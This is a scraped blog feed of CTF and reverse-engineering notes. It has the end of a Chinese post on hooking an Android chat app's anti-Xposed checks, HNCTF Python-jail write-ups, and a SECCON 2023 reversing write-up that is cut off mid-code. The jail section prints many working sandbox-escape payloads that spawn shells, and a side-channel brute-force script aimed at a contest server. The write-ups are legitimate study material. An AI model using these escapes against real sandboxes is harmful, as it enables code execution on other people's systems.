<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810173613500.png" alt="image-20230810173613500"></p>
<p>另外，可以手动调试发现，apk启动的时候会与server交互获取应用更新信息，然后触发强制更新，交互方法疑似使用的<code>okhttp</code>,但是zjwh包进行了混淆，与服务器也都用的okhttp交互，需要一定工作量找到</p>
<p>进度记录：这里仔细找引用和具体的实现方式</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810212148480.png" alt="image-20230810212148480"></p>
<p>检测xposed框架是否存在的方法，也需要hook掉</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810213654727.png" alt="image-20230810213654727"></p>
<p>这个包看起来是比较重要的，下面还有检测攻击等等函数：</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810214035445.png" alt="image-20230810214035445"></p>
<p>这个包的源码可以找到一个很类似的（虽然只有部分）：</p>
<p><a href="https://mogua.co/view_file/?file=com/ijm/detect/drisk/DRiskNativeTool.java&md5=746753952f66bd8794683d37ccdd2642&type=apk&appname=%E5%BE%97%E7%89%A9&lines=84">DRiskNativeTool.java - 得物.apk源代码分析 - 摸瓜 (mogua.co)</a></p>
<p>然后顺着搜，可以找到<a href="https://www.ijiami.cn/enindex">iJiami - Guarding the Smart World | mobile information security service provider</a>这家公司，专门做安全的，这些安全相关的包就是它家做的了</p>
<h5 id="-2"><a href="#-2" class="headerlink" title></a><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810221152187.png" alt="image-20230810221152187"></h5><p>到这里就要考虑放弃了，毕竟是商业级的加固，就算级别不高，破解再怎么说也要不小的工程量…</p>
]]></content>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnCollege</title>
    <url>/2024/02/26/pwnCollege/</url>
    <content><![CDATA[<h6 id="隐藏了"><a href="#隐藏了" class="headerlink" title="隐藏了~"></a>隐藏了~</h6><span id="more"></span>

<p>assembly crash course level 26</p>
<pre><code class="assembly">.section .text
.global _start

_start:
    cmp $4, %rdi               # Compare rdi with 3
    ja default_case            # If rdi &gt; 3, jump to default case

    # Calculate jump address based on rdi value
    lea (%rsi,%rdi,8), %rax    # rax = rsi + rdi*8 (address in jump table)
    jmp (%rax)                # Indirect jump to the address stored at rax

default_case:
    lea 32(%rsi), %rax    # rax = rsi + rdi*8 (address in jump table)
    jmp (%rax)                    # Jump to the default case address
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>pythonJail</title>
    <url>/2022/11/01/pythonJail/</url>
    <content><![CDATA[<h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h6 id="Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail"><a href="#Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail" class="headerlink" title="Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail."></a>Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h6><span id="more"></span>
<h3 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL 1"></a>LEVEL 1</h3><p><img src="/2022/11/01/pythonJail/level1.png" alt="level1"></p>
<p>From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple) <code> ().\__class\__.\__base\__.\__subclasses\__()</code></p>
<p>is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use <code>chr</code> to splicing a string that we wanted.</p>
<p>Two possible payload:</p>
<blockquote>
<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>(().<em>_class</em><em>.__base</em><em>.__subclasses__()[-4].__init__.__globals</em>_<a href="'sh'">‘system’</a>)</p>
</blockquote>
<blockquote>
<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()<br>from <a href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></p>
</blockquote>
<p><img src="/2022/11/01/pythonJail/level1wp.png" alt="level1pos"></p>
<h3 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h3><p><img src="/2022/11/01/pythonJail/level2.png" alt="level1"></p>
<p>The length of the payload is limited to 13.</p>
<p>The answer according to 空白 is the function <c style="color: #FF0000">“breakpoint()”</c>, which I didn’t figure out yet. However, there is another way. Use <code>eval(input())</code> so that the program receive once again for your input! Seems a little bit like <code>/?cmd=system($_POST[1]);$1=ls</code> to escape the filter in php right?</p>
<h3 id="LEVEL-3"><a href="#LEVEL-3" class="headerlink" title="LEVEL 3"></a>LEVEL 3</h3><p><img src="/2022/11/01/pythonJail/level3.png" alt="level3"></p>
<p>This time, the maximum length of our payload is down to 7.</p>
<p>I didn’t quite understand yet, but function <code>help()</code> can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.</p>
<blockquote>
</blockquote>
<p><img src="/2022/11/01/pythonJail/level3wp.png" alt="level3"></p>
<h3 id="PYTHON2-INPUT-JAIL"><a href="#PYTHON2-INPUT-JAIL" class="headerlink" title="PYTHON2 INPUT JAIL"></a>PYTHON2 INPUT JAIL</h3><p><img src="/2022/11/01/pythonJail/input(jail).png" alt="input(jail)"></p>
<p>python2, another thing I am not familiar with…</p>
<p>Looking up others’ write up…</p>
<p><img src="/2022/11/01/pythonJail/input(jail)wp.png" alt="input(jail)"></p>
<h3 id="LEVEL-2-5"><a href="#LEVEL-2-5" class="headerlink" title="LEVEL 2.5"></a>LEVEL 2.5</h3><p><img src="/2022/11/01/pythonJail/level2.5.png" alt="level2.5"></p>
<p>We can use <code>breakpoint()</code> to go into pdb, and rce is possible.</p>
<h3 id="LAKE"><a href="#LAKE" class="headerlink" title="LAKE"></a>LAKE</h3><p><img src="/2022/11/01/pythonJail/lake.png" alt="lake"></p>
<h6 id="Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’"><a href="#Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’" class="headerlink" title="Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)"></a>Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</h6><p>Use <code>globals()</code> to leak the key. And then get shell.</p>
<h3 id="L-KE"><a href="#L-KE" class="headerlink" title="L@KE"></a>L@KE</h3><p><img src="/2022/11/01/pythonJail/l@ke.png" alt="l@ke"></p>
<h6 id="Another-strange-christen…"><a href="#Another-strange-christen…" class="headerlink" title="Another strange christen…"></a>Another strange christen…</h6><p>The maxinum length of payload is now 6, so only <code>help()</code> is possible.</p>
<p>But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. <code>help()</code> can actually get you into any module in the python file, which includes <code>__main__</code>! And surely, the key can be found inside.</p>
<br>
##### OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
<br>


<h3 id="LEVEL-5"><a href="#LEVEL-5" class="headerlink" title="LEVEL 5"></a>LEVEL 5</h3><p><img src="/2022/11/01/pythonJail/level5.png" alt="level5"></p>
<p>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</p>
<h3 id="LEVEL-4"><a href="#LEVEL-4" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="Why-is-it-4-after-5-I-don’t-know…"><a href="#Why-is-it-4-after-5-I-don’t-know…" class="headerlink" title="(Why is it 4 after 5 I don’t know…)"></a>(Why is it 4 after 5 I don’t know…)</h6><p>4 bytes rce, seems impossible, so lets just guass it use <code>os.system(input_data)</code> to get your input and bingo.</p>
<p><img src="/2022/11/01/pythonJail/level4.png" alt="level4"></p>
<h3 id="LAkE"><a href="#LAkE" class="headerlink" title="LAkE"></a>LAkE</h3><p><img src="/2022/11/01/pythonJail/laKelaKe.png" alt="laKe"></p>
<p>This time it imports <code>sys</code> module with <a href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code> is not available. Whats more, <code>compile、eval、exec、open</code> is unfetchable. However, there use <code>random.setstate()</code> to generate its random number, which is base on Mersenne <a href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</p>
<p>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with <code>lambda</code>. Some case can be view below:</p>
<pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre>
<p>Second, if we <code>import random</code> and print <code>random.getstate</code> at the beginning, we got a tuple back. which may look like:<code>(3, (..., 624), None)</code>. The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[random:=\_\_import__(&#39;random&#39;), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre>
<h3 id="LEVEL-5-1"><a href="#LEVEL-5-1" class="headerlink" title="LEVEL 5.1"></a>LEVEL 5.1</h3><p>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</p>
<p><code>nc</code> and <code>dir()</code>(as it tells you to), found <code>my_flag</code>, try <code>list(getattr(my_flag,&#39;flag))</code>, got a <code>AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;</code>. So payload is <code>list(getattr(my_flag,&#39;flag_level5&#39;))</code></p>
<p>Another way to solve this problem(though quite similar, the latter gets its shell)</p>
<p><img src="/2022/11/01/pythonJail/level5.1_1.png" alt="level5.1_1"><br><img src="/2022/11/01/pythonJail/level5.1_2.png" alt="level5.1_2"></p>
<h3 id="LAK3"><a href="#LAK3" class="headerlink" title="LAK3"></a>LAK3</h3><p><img src="/2022/11/01/pythonJail/lak3.png" alt="lak3"></p>
<p>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is <code>__import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]</code></p>
<h5 id="a-good-blog-can-refer"><a href="#a-good-blog-can-refer" class="headerlink" title="a good blog can refer"></a><a href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5><h3 id="tyPe-Ch-nnEl"><a href="#tyPe-Ch-nnEl" class="headerlink" title="tyPe Ch@nnEl"></a>tyPe Ch@nnEl</h3><p><img src="/2022/11/01/pythonJail/sideChannel.png" alt="sideChannel"></p>
<p>I haven’t quite understand yet. So I will put the payload beforehand:</p>
<p>One possible:</p>
<pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = &#39;&#39;

def init(self):
    # self.conn = process([&#39;python3&#39;, &#39;./server_type.py&#39;])
    self.conn = remote(&#39;1.14.71.254&#39;, 28563)

def gao(self):
    payload = &#39;((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))&#39;
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter(&#39;Payload:&#39;, cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b&#39;Try&#39; in s):
                return
            elif (b&#39;bool&#39; in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception(&#39;GG simida&#39;)            
        i += 1
if __name__ == &#39;__main__&#39;:
    g = Gao()
    g.gao()
</code></pre>
<p>↑ Can took some time(when I tried)</p>
<p>Officail:</p>
<pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print(&quot;guess: &quot;, bytes(flag), chr(guess))
    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;
</code></pre>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="level-4-again"><a href="#level-4-again" class="headerlink" title="level 4 again"></a>level 4 again</h6><p><img src="/2022/11/01/pythonJail/level4_1.png" alt="level4_1"></p>
<p>Quite similar as before, just use <code>bytes().decode()</code> to pass the black list.</p>
<p><img src="/2022/11/01/pythonJail/level4wp1.png" alt="level4_1wp1"><br><img src="/2022/11/01/pythonJail/level4wp2.png" alt="level4_1wp2"></p>
<p>payload:</p>
<pre><code>().__class__.__base__.__subclasses__()
</code></pre>
<h5 id><a href="#" class="headerlink" title></a></h5><p>​    ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</p>
<p>There is another solution to this problem: I am not sure I fully understand it, so I put a <a href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre>
<p><img src="/2022/11/01/pythonJail/level4wp_3.png" alt="level4wp3"></p>
<h3 id="LEVEL-4-0-5"><a href="#LEVEL-4-0-5" class="headerlink" title="LEVEL 4.0.5"></a>LEVEL 4.0.5</h3><p>Same payload as last one.</p>
<p><img src="/2022/11/01/pythonJail/level4.0.5.png" alt="level4.0.5"></p>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4.1"></a>LEVEL 4.1</h3><p>Quite same as before.</p>
<p><img src="/2022/11/01/pythonJail/level4.1wp1.png" alt="level4.1"></p>
<p>Ps, the <code>bytes</code> is now banned, but still you can use <code>show subclassed with tuples</code> to replace, like this:</p>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre>
<h3 id="LEVEL-4-2"><a href="#LEVEL-4-2" class="headerlink" title="LEVEL 4.2"></a>LEVEL 4.2</h3><p>Quite same as before..</p>
<p><img src="/2022/11/01/pythonJail/level4.2wp.png" alt="level4.2"></p>
<h5 id="Or-rather-use-join"><a href="#Or-rather-use-join" class="headerlink" title="Or rather use join:"></a>Or rather use <code>join</code>:</h5><pre><code class="python">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
</code></pre>
<h3 id="LEVEL-4-3"><a href="#LEVEL-4-3" class="headerlink" title="LEVEL 4.3"></a>LEVEL 4.3</h3><p>Quite same as before…</p>
<p><img src="/2022/11/01/pythonJail/level4.3wp.png" alt="level4.3"></p>
<br>
##### The next few levels are become harder and harder.
<br>

<h3 id="LEVEL-6"><a href="#LEVEL-6" class="headerlink" title="LEVEL 6"></a>LEVEL 6</h3><h4 id="repetition"><a href="#repetition" class="headerlink" title="repetition:"></a>repetition:</h4><p><img src="/2022/11/01/pythonJail/level6wp1.png" alt="level6wp1"><br><img src="/2022/11/01/pythonJail/level6wp2.png" alt="level6wp2"><br><img src="/2022/11/01/pythonJail/level6wp3.png" alt="level6wp3"></p>
<h5 id="link-that-may-help-you"><a href="#link-that-may-help-you" class="headerlink" title="link that may help you"></a><a href="https://ctftime.org/writeup/31883">link that may help you</a></h5><p>The basic idea is to RCE with <code>_posixsubprocess.fork_exec</code>. If we import it directly, it will trigger the audit hook. But we can pass it by using <code>__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)</code> or <code>__loader__.load_module(&#39;_posixsubprocess&#39;)</code>. Also, due to its repeatedly exct, we just shell like this:</p>
<pre><code>import os
__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre>
<h3 id="LEVEL-6-1"><a href="#LEVEL-6-1" class="headerlink" title="LEVEL 6.1"></a>LEVEL 6.1</h3><p>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</p>
<p><img src="/2022/11/01/pythonJail/level6.1wp.png" alt="level6.1wp"></p>
<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre>
<h5 id="or"><a href="#or" class="headerlink" title="or"></a>or</h5><pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre>
<h3 id="SAFEEVAL"><a href="#SAFEEVAL" class="headerlink" title="SAFEEVAL"></a>SAFEEVAL</h3><p>Use lambda to wrap up RCE</p>
<p>payload:</p>
<pre><code>(lambda: __import__(&#39;os&#39;).system(&#39;sh&#39;))()
</code></pre>
<p><img src="/2022/11/01/pythonJail/safeeval_1.png" alt="safeeval"><br><img src="/2022/11/01/pythonJail/safeeval_2.png" alt="safeeval"></p>
<h3 id="LEVEL7"><a href="#LEVEL7" class="headerlink" title="LEVEL7"></a>LEVEL7</h3><h6 id="Come-back-later-to-try-to-figure-it-out…"><a href="#Come-back-later-to-try-to-figure-it-out…" class="headerlink" title="Come back later to try to figure it out…"></a>Come back later to try to figure it out…</h6><p>payload:</p>
<blockquote>
<p>@exec<br> @input<br> class X: pass</p>
</blockquote>
<blockquote>
<p><strong>import</strong>(‘os’).system(‘sh’)</p>
</blockquote>
<h5 id="blog"><a href="#blog" class="headerlink" title="blog"></a><a href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5><pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre>
<p><img src="/2022/11/01/pythonJail/level7wp1.png" alt="level7"><br><img src="/2022/11/01/pythonJail/level7wp2.png" alt="level7"></p>
<h3 id="Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail"><a href="#Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail" class="headerlink" title="Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:"></a>Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:</h3><pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>jail</tag>
      </tags>
  </entry>
  <entry>
    <title>seccon 2023</title>
    <url>/2023/09/18/seccon-2023/</url>
    <content><![CDATA[<h6 id="PREFACE-本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq"><a href="#PREFACE-本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq" class="headerlink" title="PREFACE: 本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq."></a>PREFACE: 本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题qaq.</h6><h6 id="基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来"><a href="#基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来" class="headerlink" title="基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来"></a>基本上算是比较少看国外赛，看了一下seccon感觉确实和平时做的差距挺大的，比如这个re很有些misc的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来</h6><h6 id="9-19-ok勉强算搞完了，这个nim的oi还是挺恶心的…"><a href="#9-19-ok勉强算搞完了，这个nim的oi还是挺恶心的…" class="headerlink" title="9-19: ok勉强算搞完了，这个nim的oi还是挺恶心的…"></a>9-19: ok勉强算搞完了，这个nim的oi还是挺恶心的…</h6><span id="more"></span>

<h4 id="jumpout"><a href="#jumpout" class="headerlink" title="jumpout"></a>jumpout</h4><p>签到题，写了个小混淆反静态看，大概意思是将所有的<code>jmp addr</code>改成类似<code>mov rax, addr; jmp rax</code>的操作，应该是写了个<code>llvm</code>小工具之类的</p>
<p>动调仔细看汇编即可，理论上可以自己修，但是没啥必要（而且也不太会，近期还得学学angr，qaq），这里只是做了三次异或</p>
<p>需要对栈上和寄存器的数据跟的比较清晰，这里的i其实没跟明白但是可以简单猜一下，实在不行就每轮都跟完也能出（<del>异或么反正，每轮都拿一个最后值就行其实</del> ~）</p>
<p>exp:</p>
<pre><code class="python">a = [  0xF6, 0xF5, 0x31, 0xC8, 0x81, 0x15, 0x14, 0x68, 0xF6, 0x35,
  0xE5, 0x3E, 0x82, 0x09, 0xCA, 0xF1, 0x8A, 0xA9, 0xDF, 0xDF,
  0x33, 0x2A, 0x6D, 0x81, 0xF5, 0xA6, 0x85, 0xDF, 0x17]


enc = [  0xF0, 0xE4, 0x25, 0xDD, 0x9F, 0x0B, 0x3C, 0x50, 0xDE, 0x04,
  0xCA, 0x3F, 0xAF, 0x30, 0xF3, 0xC7, 0xAA, 0xB2, 0xFD, 0xEF,
  0x17, 0x18, 0x57, 0xB4, 0xD0, 0x8F, 0xB8, 0xF4, 0x23]

for i in range(len(enc)):
    print(chr(i ^ 0x55 ^ enc[i] ^ a[i]),end=&#39;&#39;)

# SECCON&#123;jump_table_everywhere&#125;
</code></pre>
<h4 id="Sickle"><a href="#Sickle" class="headerlink" title="Sickle"></a>Sickle</h4><p>第一次见这个pickle加载payload反序列化调用shellcode的操作，具体其实还是不太会搞，这题<code>pickletools.dis(payload)</code>得到的结果感觉用处不大，知道有个<code>xor</code>的信息，不知道怎么提取其实（等wp出来再复现复现）但是re么真不能太纠结过程吧，反正fuzz一下，嗯看一下bytes，猜测是一个<code>rsa + xor + 倒序</code>的组合，参数很奇怪n是一个素数（开始以为要打，问了一下密码爷说不用直接可以解）解了第一段发现第二段参数不对，遂注意到<code>xor</code>参数换了，然后么就出了…</p>
<p>看这个flag内容感觉或许确实不太有动调工具，但是应该有方法起码把完整字节码反序列化拿到吧…但是确实没搞出来，晚点看看wp…</p>
<h6 id="9-19-原来可以直接改源码，增加print，这样直接就有完整流程了，orz"><a href="#9-19-原来可以直接改源码，增加print，这样直接就有完整流程了，orz" class="headerlink" title="9-19: 原来可以直接改源码，增加print，这样直接就有完整流程了，orz"></a>9-19: 原来可以直接改源码，增加print，这样直接就有完整流程了，orz</h6><p>exp:</p>
<pre><code class="python">check_values = [
    8215359690687096682,
    1862662588367509514,
    8350772864914849965,
    11616510986494699232,
    3711648467207374797,
    9722127090168848805,
    16780197523811627561,
    18138828537077112905,
]
import gmpy2
from Crypto.Util.number import long_to_bytes

xor = 1244422970072434993

for c in check_values:
    e = 65537
    n = 18446744073709551557
    phi = (18446744073709551557 - 1)
    d = gmpy2.invert(e, phi)
    m = pow(c,d,n)
    print(long_to_bytes(m ^ xor).decode()[::-1],end=&#39;&#39;)
    xor = c
# SECCON&#123;Can_someone_please_make_a_debugger_for_Pickle_bytecode??&#125;
</code></pre>
<h4 id="prefect-flu"><a href="#prefect-flu" class="headerlink" title="prefect-flu"></a>prefect-flu</h4><h6 id="9-17-没出还，很急，感觉确实有点点misc来的"><a href="#9-17-没出还，很急，感觉确实有点点misc来的" class="headerlink" title="9-17,没出还，很急，感觉确实有点点misc来的"></a>9-17,没出还，很急，感觉确实有点点misc来的</h6><p>也是第一次见，dvd iso，没搞清楚怎么提取逻辑</p>
<p>感觉可以参考是这篇：<a href="https://zhuanlan.zhihu.com/p/46518832">蓝光文件解析 - 知乎 (zhihu.com)</a>，但是里面的工具编译不出来，它的文件路径感觉是乱的，还没解决…</p>
<p>用vlc可以运行，点击很多button，会触发check逻辑一段一段播放视频，作为回显，逻辑应该是在<code>BDMV/MovieObject.bdmv</code>里面的（JAR里面明明确实没找到东西……）</p>
<p><code>BDedit</code>可以打开这个bdmv，里面有一定的运行逻辑，但是里面是缺少check flag的逻辑的，目前是还没找到check到底在哪，急急急…</p>
<p><img src="/2023/09/18/seccon-2023/image-20230918105138109.png" alt="image-20230918105138109"></p>
<h6 id="9-18-看了别的师傅的wp，出了，一步之遥…"><a href="#9-18-看了别的师傅的wp，出了，一步之遥…" class="headerlink" title="9-18,看了别的师傅的wp，出了，一步之遥…"></a>9-18,看了别的师傅的wp，出了，一步之遥…</h6><p>导入STREAM中的M2TS到这里的Menu里面，可以看每个button的具体逻辑…</p>
<p><img src="/2023/09/18/seccon-2023/image-20230918160853438.png" alt="image-20230918160853438"></p>
<p>这个<code>Call Object</code>不同的既是正确的flag，猜一下可以得到这个图（偷来的图）</p>
<p><img src="/2023/09/18/seccon-2023/image-20230918161010536.png" alt="image-20230918161010536"></p>
<p>SECCON{</p>
<p>26 11 10 25 38 4 7 12 28 38 10 11 13 28 38 32 24 21 11 38 16 23 13 17 38 31 16 15 2 38 15 25 27 27 38 27 23   </p>
<p>34 33 39</p>
<pre><code class="PYTHON">a = &#39;1234567890QWERTYUIOPASDFGHJKL&#123;ZXCVBNM_-&#125;&#39;
b = [26,11,10,25,38,4,7,12,28,38,10,11,13,28,38,32,24,21,11,38,16,23,13,17,38,31,16,15,2,38,15,25,27,27,38,27,23,34,33,39]
flag = &#39;SECCON&#123;&#39;
for i in b:
    flag += a[i]
print(flag)
# SECCON&#123;JWQH-58EL-QWRL-CGSW-UFRI-XUY3-YHKK-KFBV&#125; 没交过，感觉可能错了一两位？但是确实不想debug了先就这样
</code></pre>
<h4 id="xuyao"><a href="#xuyao" class="headerlink" title="xuyao"></a>xuyao</h4><p>一开始以为混淆的是check部分逻辑，因为确实有点点奇怪</p>
<p>结果混淆的是加密，将SM4的盒换成AES的sbox了（属于看wp看的，确实识别加密这块不熟悉qaq）</p>
<p>回来动调硬看一下可以发现这里<code>Feistel</code>的轮数都不对</p>
<p><img src="/2023/09/18/seccon-2023/image-20230919154214378.png" alt="image-20230919154214378"></p>
<p>这里旋转的位数改了：</p>
<p><img src="/2023/09/18/seccon-2023/image-20230919160104814.png" alt="image-20230919160104814"></p>
<p>然后抄一个r3的exp吧，把表换一下，改天得再重新学学sm4算法了：</p>
<pre><code class="cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#define SM4_ENCRYPT 1
#define SM4_DECRYPT 0
typedef struct &#123;
    int mode; /*!&lt; encrypt/decrypt */
    unsigned long sk[32]; /*!&lt; SM4 subkeys */
&#125; sm4_context;
void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16]);
void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16]);
void sm4_crypt_ecb(sm4_context *ctx, int mode, int length, unsigned char *input,
    unsigned char *output);
void sm4_crypt_cbc(sm4_context *ctx, int mode, int length, unsigned char iv[16],
    unsigned char *input, unsigned char *output);
#ifndef GET_ULONG_BE
#define GET_ULONG_BE(n, b, i) \
&#123; \
(n) = ((unsigned long)(b)[(i)] &lt;&lt; 24) | \
((unsigned long)(b)[(i) + 1] &lt;&lt; 16) | \
((unsigned long)(b)[(i) + 2] &lt;&lt; 8) | ((unsigned long)(b)[(i) + 3]); \
